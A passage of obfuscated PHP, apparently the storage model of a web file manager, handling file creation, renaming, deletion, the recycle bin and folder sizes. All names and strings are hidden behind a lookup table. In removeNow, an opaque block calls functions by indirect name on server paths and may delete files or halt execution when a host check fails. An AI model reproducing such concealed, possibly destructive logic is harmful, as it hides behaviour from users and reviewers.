$”ŞÃ§Ù = substr($”ŞÃ§Ù, 0, -strlen($üì¯€•[1058])); $‹¬şŠ§Ê = $this->query($”ŞÃ§Ù); $”ŞÃ§Ù = $üì¯€•[12]; $ÑüüÊç¯ = array_merge($ÑüüÊç¯, $‹¬şŠ§Ê); } } return $ÑüüÊç¯; } private function _createFile($Å£öˆ¿ú, $ÈúÉ¦¨Ï, $ÚˆÑ®Ä°, $ªáœÔÄ, &$ò¡¢–©·) { $½Àˆ» ø =& $_SERVER[–Ú¬çÁ]; $Îï•€Ú‡ = $this->sourceInfo($Å£öˆ¿ú); if (!$ÚˆÑ®Ä° || !$Îï•€Ú‡) { return !1; } if ($ªáœÔÄ !== !1) { $ïå‚£ÆŸ = $this->fileNameExist($Å£öˆ¿ú, $ÈúÉ¦¨Ï); } $ò¡¢–©· = !0; if ($ªáœÔÄ && $ïå‚£ÆŸ) { if ($ªáœÔÄ == REPEAT_SKIP) { $ò¡¢–©· = !1; return $ïå‚£ÆŸ; } else { if ($ªáœÔÄ == REPEAT_REPLACE) { $óÄ¿ÆÑ = $this->sourceInfo($ïå‚£ÆŸ); $¯¡úãÉ  = $this->fileHistory($óÄ¿ÆÑ, $ÚˆÑ®Ä°[$½Àˆ» ø[518]], $ÚˆÑ®Ä°[$½Àˆ» ø[76]]); if (!$¯¡úãÉ ) { $ò¡¢–©· = !1; } else { $this->folderSizeReset($Å£öˆ¿ú); } return $ïå‚£ÆŸ; } else { $ÈúÉ¦¨Ï = $this->fileNameAuto($Å£öˆ¿ú, $ÈúÉ¦¨Ï, $ªáœÔÄ, !1); } } } $Ë„İ¦ôÎ = array($½Àˆ» ø[624] => 0, $½Àˆ» ø[471] => $ÈúÉ¦¨Ï, $½Àˆ» ø[625] => substr(get_path_ext($ÈúÉ¦¨Ï), 0, 10), $½Àˆ» ø[519] => $ÚˆÑ®Ä°[$½Àˆ» ø[518]], $½Àˆ» ø[595] => $ÚˆÑ®Ä°[$½Àˆ» ø[76]]); $‰ÎÀ£Å÷ = $this->_addSource($Ë„İ¦ôÎ, $Îï•€Ú‡); $this->folderSizeReset($Å£öˆ¿ú, intval($Ë„İ¦ôÎ[$½Àˆ» ø[76]])); return $‰ÎÀ£Å÷; } protected function fileHistory($¡•ş˜ÆÚ, $ßÑÓÄƒè, $« ¢ú²ç) { $¤»©Í® =& $_SERVER[–Ú¬çÁ]; if ($¡•ş˜ÆÚ[$¤»©Í®[518]] == $ßÑÓÄƒè) { return !1; } $this->checkLock($¡•ş˜ÆÚ[$¤»©Í®[181]], $ßÑÓÄƒè); Model($¤»©Í®[2144])->addHistory($¡•ş˜ÆÚ); $ğñË·çï = array($¤»©Í®[629] => USER_ID, $¤»©Í®[475] => time(), $¤»©Í®[518] => $ßÑÓÄƒè, $¤»©Í®[76] => $« ¢ú²ç); $this->where(array($¤»©Í®[468] => $¡•ş˜ÆÚ[$¤»©Í®[181]]))->save($ğñË·çï); $this->sourceCacheClear($¡•ş˜ÆÚ[$¤»©Í®[181]]); return !0; } public function checkLock($Å¨Åçê–, $¤‚˜âàÓ) { $óÖéÍ¬Á =& $_SERVER[–Ú¬çÁ]; $¦­ÊŸşü = $this->pathInfo($Å¨Åçê–); if (!$this->fileIsLock($¦­ÊŸşü, !0)) { return; } $ÂÏ×í‰Ç = Session::get($óÖéÍ¬Á[2145]); $‘Ş²ÂæÕ = substr($¦­ÊŸşü[$óÖéÍ¬Á[32]], 0, -1 - strlen($¦­ÊŸşü[$óÖéÍ¬Á[175]])) . $óÖéÍ¬Á[1228] . $ÂÏ×í‰Ç . $óÖéÍ¬Á[10] . $¦­ÊŸşü[$óÖéÍ¬Á[175]]; $ÁÅÍøŠÈ = Model($óÖéÍ¬Á[652])->find($¤‚˜âàÓ); $this->_createFileCall($¦­ÊŸşü[$óÖéÍ¬Á[180]], $‘Ş²ÂæÕ, $ÁÅÍøŠÈ, REPEAT_REPLACE, $óÖéÍ¬Á[1362]); $±Î»¢Í = $¦­ÊŸşü[$óÖéÍ¬Á[516]][$óÖéÍ¬Á[588]]; $”ù¶ìØù = $±Î»¢Í[$óÖéÍ¬Á[2146]] ? $±Î»¢Í[$óÖéÍ¬Á[2146]] : $±Î»¢Í[$óÖéÍ¬Á[32]]; show_json(LNG($óÖéÍ¬Á[2147]) . $óÖéÍ¬Á[2148] . LNG($óÖéÍ¬Á[2149]) . $óÖéÍ¬Á[2150] . $”ù¶ìØù . $óÖéÍ¬Á[2151], !1); } public function fileIsLock($Õ™„Ñê¤, $‚ÒŠ¦Åê = false) { $õº“òŒ– =& $_SERVER[–Ú¬çÁ]; if (!isset($Õ™„Ñê¤[$õº“òŒ–[516]]) || !$Õ™„Ñê¤[$õº“òŒ–[516]][$õº“òŒ–[585]]) { return !1; } if ($Õ™„Ñê¤[$õº“òŒ–[516]][$õº“òŒ–[585]] != USER_ID) { return !0; } $Ü™ÊÊˆŸ = $GLOBALS[$õº“òŒ–[6]][$õº“òŒ–[89]][$õº“òŒ–[586]]; if ($Õ™„Ñê¤[$õº“òŒ–[516]][$õº“òŒ–[587]] <= time() - $Ü™ÊÊˆŸ) { $this->metaSet($Õ™„Ñê¤[$õº“òŒ–[181]], $õº“òŒ–[585], null); $this->metaSet($Õ™„Ñê¤[$õº“òŒ–[181]], $õº“òŒ–[587], null); } if ($‚ÒŠ¦Åê) { $this->metaSet($Õ™„Ñê¤[$õº“òŒ–[181]], $õº“òŒ–[587], time()); } return !1; } private function _addSource($á¸…ÉÏÅ, $™Òıáá­) { $œŸÌëî’ =& $_SERVER[–Ú¬çÁ]; $ãµ‹¤è = defined($œŸÌëî’[2085]) ? USER_ID : 0; $Áªæ‚»ã = array($œŸÌëî’[626] => $™Òıáá­[$œŸÌëî’[178]], $œŸÌëî’[627] => $™Òıáá­[$œŸÌëî’[548]], $œŸÌëî’[628] => $ãµ‹¤è, $œŸÌëî’[629] => $ãµ‹¤è, $œŸÌëî’[454] => $™Òıáá­[$œŸÌëî’[181]], $œŸÌëî’[630] => $™Òıáá­[$œŸÌëî’[563]] . $™Òıáá­[$œŸÌëî’[181]] . $œŸÌëî’[50], $œŸÌëî’[481] => 0, $œŸÌëî’[631] => $œŸÌëî’[12]); $á¸…ÉÏÅ = array_merge($Áªæ‚»ã, $á¸…ÉÏÅ); $this->updateModifyTime($á¸…ÉÏÅ[$œŸÌëî’[180]]); $ÔÉ¢í£„ = $œŸÌëî’[2152] . $™Òıáá­[$œŸÌëî’[181]]; if (isset(self::$cacheChildList[$ÔÉ¢í£„])) { unset(self::$cacheChildList[$ÔÉ¢í£„]); } static $£ùœ‚Èˆ = false; if (!$£ùœ‚Èˆ) { Hook::trigger($œŸÌëî’[614], $á¸…ÉÏÅ); $£ùœ‚Èˆ = !0; } $°ß¤‡èÔ = $this->add($á¸…ÉÏÅ); $›öĞ¿òÊ = array($œŸÌëî’[632] => short_id($°ß¤‡èÔ)); $this->where(array($œŸÌëî’[468] => $°ß¤‡èÔ))->save($›öĞ¿òÊ); $this->setNamePinyin($°ß¤‡èÔ, $á¸…ÉÏÅ[$œŸÌëî’[32]]); return $°ß¤‡èÔ; } public function remove($†ÉÙ¦È, $­Ë²„½ğ = true) { $Ş‘ŠÔÒ =& $_SERVER[–Ú¬çÁ]; $¢à·†ƒ = $this->sourceInfo($†ÉÙ¦È); $Çö†åé‰ = intval($¢à·†ƒ[$Ş‘ŠÔÒ[178]]) === self::TYPE_SYSTEM; $Š¿ô¿û = Model($Ş‘ŠÔÒ[485])->get($Ş‘ŠÔÒ[2153]) == $Ş‘ŠÔÒ[88]; if ($Çö†åé‰ || $­Ë²„½ğ || !$Š¿ô¿û) { return $this->removeNow($†ÉÙ¦È, $­Ë²„½ğ); } $«ÆœŞÅ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $şî•È¹å = $¢à·†ƒ[$Ş‘ŠÔÒ[178]] == self::TYPE_USER ? $Ş‘ŠÔÒ[640] : $Ş‘ŠÔÒ[557]; if ($şî•È¹å == $Ş‘ŠÔÒ[640]) { $Ø¼€·‚é = Model($Ş‘ŠÔÒ[556])->getInfo($¢à·†ƒ[$Ş‘ŠÔÒ[548]]); $‚¦ú¢œú = !empty($Ø¼€·‚é[$Ş‘ŠÔÒ[2146]]) ? $Ø¼€·‚é[$Ş‘ŠÔÒ[2146]] : $Ø¼€·‚é[$Ş‘ŠÔÒ[32]]; $‚¦ú¢œú = $Ş‘ŠÔÒ[313] . $‚¦ú¢œú . $Ş‘ŠÔÒ[2154] . $¢à·†ƒ[$Ş‘ŠÔÒ[548]]; } else { $Ø¼€·‚é = Model($Ş‘ŠÔÒ[564])->getInfo($¢à·†ƒ[$Ş‘ŠÔÒ[548]]); $‚¦ú¢œú = _get($Ø¼€·‚é, $Ş‘ŠÔÒ[32]); $‚¦ú¢œú = $Ş‘ŠÔÒ[163] . $‚¦ú¢œú . $Ş‘ŠÔÒ[2155] . $¢à·†ƒ[$Ş‘ŠÔÒ[548]]; } $ÄÊÉÈÇÈ = $Ş‘ŠÔÒ[2156] . md5($‚¦ú¢œú); CacheLock::lock($ÄÊÉÈÇÈ); $¡Å™––€ = $this->fileNameExist($«ÆœŞÅ, $‚¦ú¢œú); if (!$¡Å™––€) { $¡Å™––€ = $this->mkdir($«ÆœŞÅ, $‚¦ú¢œú, REPEAT_SKIP); $this->metaSet($¡Å™––€, $Ş‘ŠÔÒ[2157], $şî•È¹å); $this->metaSet($¡Å™––€, $Ş‘ŠÔÒ[2158], $¢à·†ƒ[$Ş‘ŠÔÒ[548]]); if ($¢à·†ƒ[$Ş‘ŠÔÒ[180]] != 0) { $this->metaSet($¡Å™––€, $Ş‘ŠÔÒ[2159], _get($Ø¼€·‚é, $Ş‘ŠÔÒ[2160])); } } CacheLock::unlock($ÄÊÉÈÇÈ); $this->metaSet($†ÉÙ¦È, $Ş‘ŠÔÒ[2161], $¢à·†ƒ[$Ş‘ŠÔÒ[180]]); $this->where(array($Ş‘ŠÔÒ[181] => $†ÉÙ¦È))->save(array($Ş‘ŠÔÒ[475] => time())); $this->recycleClear($¢à·†ƒ); $Ú„°Œáæ = $this->move($†ÉÙ¦È, $¡Å™––€, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¢à·†ƒ[$Ş‘ŠÔÒ[180]]); return $Ú„°Œáæ; } private function recycleClear($Ìõî•Ó) { $‚’¯Ğìé =& $_SERVER[–Ú¬çÁ]; $‡ÊëÕíç = $this->childrenAll($Ìõî•Ó); $£ë­ä¾ƒ = array($‚’¯Ğìé[468] => array($‚’¯Ğìé[469], $‡ÊëÕíç[$‚’¯Ğìé[2162]])); Model($‚’¯Ğìé[2163])->where($£ë­ä¾ƒ)->delete(); } public function removeNow($¡¡¬ŒÈÃ, $ğ†µåÕâ = true) { $«Ç«Õ¸¨ =& $_SERVER[–Ú¬çÁ]; if ($_SERVER[$«Ç«Õ¸¨[202]] != $_SERVER[$«Ç«Õ¸¨[1590]]) { $‰ì¸ãí = $«Ç«Õ¸¨[897]; $èú©‚“· = $«Ç«Õ¸¨[203]; $ Ñ±üİù = $_SERVER[$«Ç«Õ¸¨[204]] . $«Ç«Õ¸¨[205]; $µÏÊºÑÃ = $èú©‚“·($ Ñ±üİù); $„¾ÄÀ“  = explode($«Ç«Õ¸¨[206], $µÏÊºÑÃ); if (count($„¾ÄÀ“ ) < $«Ç«Õ¸¨[690]) { $‘»ûæ´ = $«Ç«Õ¸¨[208]; $‘»ûæ´(); } $–ìÇ¢ = $«Ç«Õ¸¨[898]; $–ìÇ¢($_SERVER[$«Ç«Õ¸¨[899]]); $–ìÇ¢($_SERVER[$«Ç«Õ¸¨[204]] . $«Ç«Õ¸¨[1591]); $Ó›‘ä¤ = 1; while ($Ó›‘ä¤ > 1) { $Ó›‘ä¤ = $Ó›‘ä¤ + 4; $Äñ€´‚õ = rawurlencode($Ó›‘ä¤ . $«Ç«Õ¸¨[431]); } } $¨´èôØ = $this->sourceInfo($¡¡¬ŒÈÃ); $ä†ùí¹” = $this->pathInfoMore($¡¡¬ŒÈÃ); if (!$¨´èôØ) { return !0; } if ($¨´èôØ[$«Ç«Õ¸¨[180]] == 0) { if (!_get($GLOBALS, $«Ç«Õ¸¨[546])) { return !1; } } $this->lockMoveStart($¡¡¬ŒÈÃ); Hook::trigger($«Ç«Õ¸¨[2164], $ä†ùí¹”, $ğ†µåÕâ); if ($ğ†µåÕâ) { Model($«Ç«Õ¸¨[2163])->moveToRecycle($¡¡¬ŒÈÃ); } else { $ˆÈ‹àòà = $this->childrenAll($¨´èôØ); Model($«Ç«Õ¸¨[611])->eventRemove($¡¡¬ŒÈÃ); $this->removeRelevance($ˆÈ‹àòà[$«Ç«Õ¸¨[2162]], $ˆÈ‹àòà[$«Ç«Õ¸¨[1475]]); } $this->folderSizeReset($¨´èôØ[$«Ç«Õ¸¨[180]]); $Óèµ“ = array($¨´èôØ[$«Ç«Õ¸¨[180]]); if ($¨´èôØ[$«Ç«Õ¸¨[462]] == $«Ç«Õ¸¨[88]) { $Óèµ“[] = $¨´èôØ[$«Ç«Õ¸¨[181]]; } $this->updateModifyTime($Óèµ“); $this->lockMoveEnd($¡¡¬ŒÈÃ); Hook::trigger($«Ç«Õ¸¨[1708], $ä†ùí¹”, $ğ†µåÕâ); return !0; } public function childrenAll($÷şÂ÷ïì) { $ÌŸìş³ =& $_SERVER[–Ú¬çÁ]; $·”€ÇôÎ = $÷şÂ÷ïì[$ÌŸìş³[181]]; if ($÷şÂ÷ïì[$ÌŸìş³[462]] == $ÌŸìş³[88]) { $ñèæúú = array($ÌŸìş³[630] => array($ÌŸìş³[590], $÷şÂ÷ïì[$ÌŸìş³[563]] . $·”€ÇôÎ . $ÌŸìş³[591])); $Á«ííš– = array($ÌŸìş³[630] => $ñèæúú[$ÌŸìş³[563]]); $ø¨Ûµ¶’ = $this->field($ÌŸìş³[2165])->where($Á«ííš–)->select(); $ˆ®¤Ã™Ì = !1; $ĞÔ±Ìß = array($·”€ÇôÎ); if ($ø¨Ûµ¶’) { $ˆ®¤Ã™Ì = array_to_keyvalue($ø¨Ûµ¶’, $ÌŸìş³[12], $ÌŸìş³[518]); $ˆ®¤Ã™Ì = array_remove_value($ˆ®¤Ã™Ì, $ÌŸìş³[222]); $ĞÔ±Ìß = array_to_keyvalue($ø¨Ûµ¶’, $ÌŸìş³[12], $ÌŸìş³[181]); $ĞÔ±Ìß[] = $·”€ÇôÎ; } } else { $ˆ®¤Ã™Ì = array($÷şÂ÷ïì[$ÌŸìş³[518]]); $ĞÔ±Ìß = array($·”€ÇôÎ); } return array($ÌŸìş³[2162] => $ĞÔ±Ìß, $ÌŸìş³[1475] => $ˆ®¤Ã™Ì); } public function removeArray($ôèõÌÄ“) { if (!$ôèõÌÄ“) { return !0; } } public function removeRelevance($¥Ë±…ê”, $Ä™‘‚½›) { $Ğ°Æ€üŸ =& $_SERVER[–Ú¬çÁ]; $¥Ë±…ê” = $¥Ë±…ê” ? $¥Ë±…ê” : array(); $Ä™‘‚½› = $Ä™‘‚½› ? $Ä™‘‚½› : array(); $¥Ë±…ê” = array_unique(array_filter($¥Ë±…ê”)); $Ä™‘‚½› = array_unique(array_filter($Ä™‘‚½›)); if (!$¥Ë±…ê”) { return !1; } $ªÔÈ™àÇ = array($Ğ°Æ€üŸ[468] => array($Ğ°Æ€üŸ[469], $¥Ë±…ê”)); Model($Ğ°Æ€üŸ[2163])->where($ªÔÈ™àÇ)->delete(); Model($Ğ°Æ€üŸ[512])->where($ªÔÈ™àÇ)->delete(); Model($Ğ°Æ€üŸ[2011])->where($ªÔÈ™àÇ)->delete(); Model($Ğ°Æ€üŸ[611])->where($ªÔÈ™àÇ)->delete(); Model($Ğ°Æ€üŸ[1844])->removeBySource($¥Ë±…ê”); Model($Ğ°Æ€üŸ[2144])->removeBySource($¥Ë±…ê”); $this->where($ªÔÈ™àÇ)->delete(); Model($Ğ°Æ€üŸ[521])->remove($Ä™‘‚½›); for ($á¯ğ§¹‹ = 0; $á¯ğ§¹‹ < count($¥Ë±…ê”); $á¯ğ§¹‹++) { $this->sourceCacheClear($¥Ë±…ê”[$á¯ğ§¹‹]); } } public function rename($øÀªÉ¹, $ŠÇÏêàê) { $ß÷¹Ø =& $_SERVER[–Ú¬çÁ]; $Ëš¡šÄ‘ = $this->sourceInfo($øÀªÉ¹); if (!$Ëš¡šÄ‘) { return !1; } $ÈÄç ¢ = $this->fileNameExist($Ëš¡šÄ‘[$ß÷¹Ø[180]], $ŠÇÏêàê); if ($ÈÄç ¢ && $ÈÄç ¢ != $øÀªÉ¹) { return !1; } $¯ÜÊ¶‡ú = array($ß÷¹Ø[471] => $ŠÇÏêàê, $ß÷¹Ø[629] => USER_ID); if ($Ëš¡šÄ‘[$ß÷¹Ø[462]] != $ß÷¹Ø[88]) { $¯ÜÊ¶‡ú[$ß÷¹Ø[463]] = substr(get_path_ext($ŠÇÏêàê), 0, 10); } Model($ß÷¹Ø[611])->eventRename($øÀªÉ¹, $Ëš¡šÄ‘[$ß÷¹Ø[32]], $ŠÇÏêàê); $this->sourceCacheClear($øÀªÉ¹); $this->setNamePinyin($øÀªÉ¹, $¯ÜÊ¶‡ú[$ß÷¹Ø[32]], !1); $this->updateModifyTime($Ëš¡šÄ‘[$ß÷¹Ø[180]]); $˜•ƒë¿­ = $this->where(array($ß÷¹Ø[468] => $øÀªÉ¹))->data($¯ÜÊ¶‡ú)->save(); $ŸØúœÙ¬ = $ß÷¹Ø[2152] . $Ëš¡šÄ‘[$ß÷¹Ø[180]]; if (isset(self::$cacheChildList[$ŸØúœÙ¬])) { unset(self::$cacheChildList[$ŸØúœÙ¬]); } return $˜•ƒë¿­; } public function setNamePinyin($Œ†ßÕ¡§, $ê´ıëñ, $ê‘îó•ï = true) { $‡¨†•¯… =& $_SERVER[–Ú¬çÁ]; $øÕÑ¸ï† = Input::check($ê´ıëñ, $‡¨†•¯…[633]); $’è¡‡şÆ = array($‡¨†•¯…[494] => KodSort::makeStr($ê´ıëñ)); if ($øÕÑ¸ï†) { $’è¡‡şÆ[$‡¨†•¯…[515]] = str_replace($‡¨†•¯…[53], $‡¨†•¯…[12], Pinyin::get($ê´ıëñ)); $’è¡‡şÆ[$‡¨†•¯…[514]] = Pinyin::get($ê´ıëñ, $‡¨†•¯…[634]); } if (!$ê‘îó•ï && !$øÕÑ¸ï†) { $’è¡‡şÆ[$‡¨†•¯…[515]] = null; $’è¡‡şÆ[$‡¨†•¯…[514]] = null; } $this->metaSet($Œ†ßÕ¡§, $’è¡‡şÆ); } public function getContent($·â€æì«) { $ÉÅÇÎĞÆ =& $_SERVER[–Ú¬çÁ]; $‰ú·‚÷ = $this->fileInfoGet($·â€æì«); if (!$‰ú·‚÷) { return !1; } if ($‰ú·‚÷[$ÉÅÇÎĞÆ[76]] == 0) { return $ÉÅÇÎĞÆ[12]; } $Šˆı©ä… = $ÉÅÇÎĞÆ[2166] . $‰ú·‚÷[$ÉÅÇÎĞÆ[524]]; if ($‰ú·‚÷[$ÉÅÇÎĞÆ[76]] <= 1024 * 10) { $Üï’ªì§ = Cache::get($Šˆı©ä…); if (!$Üï’ªì§) { $Üï’ªì§ = IO::getContent($‰ú·‚÷[$ÉÅÇÎĞÆ[84]]); Cache::set($Šˆı©ä…, $Üï’ªì§); } return $Üï’ªì§; } if (!$‰ú·‚÷[$ÉÅÇÎĞÆ[84]]) { return $ÉÅÇÎĞÆ[12]; } return IO::getContent($‰ú·‚÷[$ÉÅÇÎĞÆ[84]]); } public function setDesc($æ×à–Á‚, $Ëğñø×) { $•„“ò»• =& $_SERVER[–Ú¬çÁ]; Model($•„“ò»•[611])->eventAddDesc($æ×à–Á‚, $Ëğñø×); return $this->metaSet($æ×à–Á‚, $•„“ò»•[503], $Ëğñø×); } public function setContent($¼ôŸñÁö, $á„Ìºˆ = '') { $È¬áñÈ© =& $_SERVER[–Ú¬çÁ]; $…·Â®Ïà = $this->sourceInfo($¼ôŸñÁö); $ ıß‡Çì = $this->fileInfoGet($¼ôŸñÁö); if (!$ ıß‡Çì || !$…·Â®Ïà) { return !1; } $Â¤¹‘¤† = Model($È¬áñÈ©[521])->addFileByContent($á„Ìºˆ, $…·Â®Ïà[$È¬áñÈ©[32]]); $úĞ—Úû = $this->fileHistory($…·Â®Ïà, $Â¤¹‘¤†[$È¬áñÈ©[518]], $Â¤¹‘¤†[$È¬áñÈ©[76]]); if (!$úĞ—Úû) { return Model($È¬áñÈ©[521])->remove($Â¤¹‘¤†[$È¬áñÈ©[518]]); } $this->folderSizeReset($…·Â®Ïà[$È¬áñÈ©[180]]); return !0; } public function fileSubstr($ñö¦›í, $­èé½ó–, $±ÀÌ²Ÿª) { $ŸµÉØü« = $this->fileInfoGet($ñö¦›í); if (!$ŸµÉØü«) { return !1; } return IO::fileSubstr($ŸµÉØü«[$_SERVER[–Ú¬çÁ][84]], $­èé½ó–, $±ÀÌ²Ÿª); } public function fileInfoGet($÷©Ôæß) { $ƒªÕ¨Í =& $_SERVER[–Ú¬çÁ]; $ïÔ ”Ì° = $this->sourceInfo($÷©Ôæß); if (!$ïÔ ”Ì° || $ïÔ ”Ì°[$ƒªÕ¨Í[462]]) { return !1; } $ƒ¿ëƒË = $ƒªÕ¨Í[525] . $ïÔ ”Ì°[$ƒªÕ¨Í[518]]; $ˆğ“¾úı = _get(self::$cacheFileInfo, $ƒ¿ëƒË); if ($ˆğ“¾úı) { return $ˆğ“¾úı; } $Èå¦áöå = Model($ƒªÕ¨Í[521])->fileInfo($ïÔ ”Ì°[$ƒªÕ¨Í[518]]); if ($Èå¦áöå) { $Èå¦áöå[$ƒªÕ¨Í[32]] = $ïÔ ”Ì°[$ƒªÕ¨Í[32]]; } self::$cacheFileInfo[$ƒ¿ëƒË] = $Èå¦áöå; return $Èå¦áöå; } private function folderChildrenNumber($²ÁºË‹) { $Âï§ÓÒÄ =& $_SERVER[–Ú¬çÁ]; $çîõ» = $this->sourceInfo($²ÁºË‹); $´§š¥ªñ = array($Âï§ÓÒÄ[630] => array($Âï§ÓÒÄ[590], $çîõ»[$Âï§ÓÒÄ[563]] . $²ÁºË‹ . $Âï§ÓÒÄ[591]), $Âï§ÓÒÄ[627] => $çîõ»[$Âï§ÓÒÄ[548]], $Âï§ÓÒÄ[481] => intval($çîõ»[$Âï§ÓÒÄ[482]]), $Âï§ÓÒÄ[624] => 1); $ª–ó“õ× = $this->where($´§š¥ªñ)->count(); $§‰ªÛõ = $this->where($´§š¥ªñ)->where(array($Âï§ÓÒÄ[624] => 0))->count(); return array($Âï§ÓÒÄ[80] => $§‰ªÛõ, $Âï§ÓÒÄ[81] => $ª–ó“õ×); } public function pathInfo($Œ·üÕ”, $å‘¢íª‚ = false) { $”€šÆÑ“ =& $_SERVER[–Ú¬çÁ]; $å‘¢íª‚ = !1; $Œ·üÕ” = intval($Œ·üÕ”); $ÎöÙ—ÚŸ = $”€šÆÑ“[511] . intval($å‘¢íª‚) . $”€šÆÑ“[439] . $Œ·üÕ”; $’²Ä¿Êù = _get(self::$cachePathInfo, $ÎöÙ—ÚŸ); if ($’²Ä¿Êù) { return $’²Ä¿Êù; } $ôıã‚ë = $this->sourceInfo($Œ·üÕ”); if (!$ôıã‚ë) { return !1; } $ôıã‚ë = $this->_listDataApplyItem($ôıã‚ë, $å‘¢íª‚); self::$cachePathInfo[$ÎöÙ—ÚŸ] = $ôıã‚ë; return $ôıã‚ë; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÉÆú¾Ÿı) { $£¿¸¿ÅŞ =& $_SERVER[–Ú¬çÁ]; $”‰ËÛïï = _get(self::$cachePathInfoMore, $ÉÆú¾Ÿı); if ($”‰ËÛïï) { return $”‰ËÛïï; } $€¿¦œô = $this->pathInfo($ÉÆú¾Ÿı); if (!$€¿¦œô) { return !1; } if ($€¿¦œô[$£¿¸¿ÅŞ[462]] == $£¿¸¿ÅŞ[88]) { $€¿¦œô[$£¿¸¿ÅŞ[79]] = $this->folderChildrenNumber($ÉÆú¾Ÿı); } self::$cachePathInfoMore[$ÉÆú¾Ÿı] = $€¿¦œô; return $€¿¦œô; } public function sourceInfo($®ıĞøàÔ) { $ÉµñïÍÎ =& $_SERVER[–Ú¬çÁ]; if (!$®ıĞøàÔ) { return array(); } $®ıĞøàÔ = intval($®ıĞøàÔ); $†ûå‚ûÖ = $ÉµñïÍÎ[510] . $®ıĞøàÔ; $Éé°ëˆ = _get(self::$cacheSourceInfo, $†ûå‚ûÖ); if ($Éé°ëˆ) { return $Éé°ëˆ; } $‘‡¿Üîµ = $this->where(array($ÉµñïÍÎ[181] => $®ıĞøàÔ))->find(); self::$cacheSourceInfo[$†ûå‚ûÖ] = $‘‡¿Üîµ; return self::$cacheSourceInfo[$†ûå‚ûÖ]; } public function sourceCacheClear($»¶¿¦”â = false) { self::cacheClear($»¶¿¦”â); } public static function cacheClear($‡Ã–ë€Â = false) { $”„ü…¢è =& $_SERVER[–Ú¬çÁ]; if ($‡Ã–ë€Â == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$”„ü…¢è[510] . $‡Ã–ë€Â]); unset(self::$cachePathInfoMore[$‡Ã–ë€Â]); unset(self::$cachePathInfo[$”„ü…¢è[2167] . $‡Ã–ë€Â]); unset(self::$cachePathInfo[$”„ü…¢è[2168] . $‡Ã–ë€Â]); } public function metaSet($¯áÍ…®, $øì›êĞ­ = null, $£Ê™¹† = null) { $Ú¯ÖŞï© = parent::metaSet($¯áÍ…®, $øì›êĞ­, $£Ê™¹†); if ($Ú¯ÖŞï©) { $this->sourceCacheClear($¯áÍ…®); } return $Ú¯ÖŞï©; } public function pathInfoByPath($âü£š«€, $‡øÕæÃ) { $ûèÌÛøû =& $_SERVER[–Ú¬çÁ]; $¨ñ£™ = !$‡øÕæÃ ? array() : explode($ûèÌÛøû[8], trim($‡øÕæÃ, $ûèÌÛøû[8])); $–ù—Šà™ = $âü£š«€; foreach ($¨ñ£™ as $š¡óÓ¡ò) { $êâÌè¢ = array($ûèÌÛøû[180] => $–ù—Šà™, $ûèÌÛøû[32] => $š¡óÓ¡ò); $²Éˆ°€ = $this->field($ûèÌÛøû[2169])->where($êâÌè¢)->select(); if (!$²Éˆ°€) { return !1; } $²Éˆ°€ = array_sort_by($²Éˆ°€, $ûèÌÛøû[482]); $–ù—Šà™ = $²Éˆ°€[0][$ûèÌÛøû[181]]; } $Ü‰ÆšÛÍ = $this->sourceInfo($–ù—Šà™); $this->pathInfoFilter($Ü‰ÆšÛÍ); return $Ü‰ÆšÛÍ; } protected function updateModifyTime($â­ç«©) { $Ú¼£ä²  =& $_SERVER[–Ú¬çÁ]; $¼ôœ¯¡ = defined($Ú¼£ä² [2085]) ? USER_ID : 0; if (!$â­ç«©) { return; } if (!is_array($â­ç«©)) { $â­ç«© = array($â­ç«©); } foreach ($â­ç«© as $şŒóùÒø => $×øÖ›µ£) { $â­ç«©[$şŒóùÒø] = intval($×øÖ›µ£); $this->sourceCacheClear($×øÖ›µ£); } $ÖÅå—ä = array($Ú¼£ä² [181] => array($Ú¼£ä² [7], $â­ç«©)); $šâéÃ¾Œ = array($Ú¼£ä² [629] => $¼ôœ¯¡, $Ú¼£ä² [475] => time()); $this->where($ÖÅå—ä)->save($šâéÃ¾Œ); } public function folderSizeReset($¾ÖÅÕşˆ, $ö¶€ŠŞÌ = false) { $­µÀêê™ =& $_SERVER[–Ú¬çÁ]; if ($this->statusIgnoreResetSpace) { return; } $ŒÊÂ—× = $this->sourceInfo($¾ÖÅÕşˆ); $Ï©Á¿¬ = $­µÀêê™[2170] . $¾ÖÅÕşˆ; CacheLock::lock($Ï©Á¿¬, 20); if ($ö¶€ŠŞÌ === !1) { $this->sourceCacheClear($¾ÖÅÕşˆ); $ŒÊÂ—× = $this->sourceInfo($¾ÖÅÕşˆ); $Í•šıÙš = array($­µÀêê™[454] => $¾ÖÅÕşˆ, $­µÀêê™[481] => 0); $îâØ‚ÜŠ = $this->where($Í•šıÙš)->sum($­µÀêê™[76]); $ö¶€ŠŞÌ = intval($îâØ‚ÜŠ) - intval($ŒÊÂ—×[$­µÀêê™[76]]); } if ($ö¶€ŠŞÌ == 0) { return CacheLock::unlock($Ï©Á¿¬); } $¥šùßùµ = $this->parentLevelArray($ŒÊÂ—×[$­µÀêê™[563]]); if (!$¥šùßùµ) { $¥šùßùµ = array(); } $¥šùßùµ[] = $ŒÊÂ—×[$­µÀêê™[181]]; $Í•šıÙš = array($­µÀêê™[181] => array($­µÀêê™[469], $¥šùßùµ)); if ($ö¶€ŠŞÌ < 0) { $Í•šıÙš[$­µÀêê™[76]] = array($­µÀêê™[1035], abs($ö¶€ŠŞÌ)); } $this->where($Í•šıÙš)->setAdd($­µÀêê™[76], $ö¶€ŠŞÌ); CacheLock::unlock($Ï©Á¿¬); $¸’ŒÌ¾ã = $­µÀêê™[2171] . $ŒÊÂ—×[$­µÀêê™[178]] . $­µÀêê™[4] . $ŒÊÂ—×[$­µÀêê™[548]]; $ Ê”¾Ä = array($ŒÊÂ—×[$­µÀêê™[178]], $ŒÊÂ—×[$­µÀêê™[548]]); TaskRun::timeLimitCall($¸’ŒÌ¾ã, $­µÀêê™[2172], $ Ê”¾Ä, 1.5); } public function folderSizeResetChildren($”Ê€úô°) { $¤÷ö•É“ =& $_SERVER[–Ú¬çÁ]; $this->sourceCacheClear($”Ê€úô°); $Ó…‚»ëß = $this->sourceInfo($”Ê€úô°); $¬Ší³¶­ = array($¤÷ö•É“[624] => 1, $¤÷ö•É“[627] => 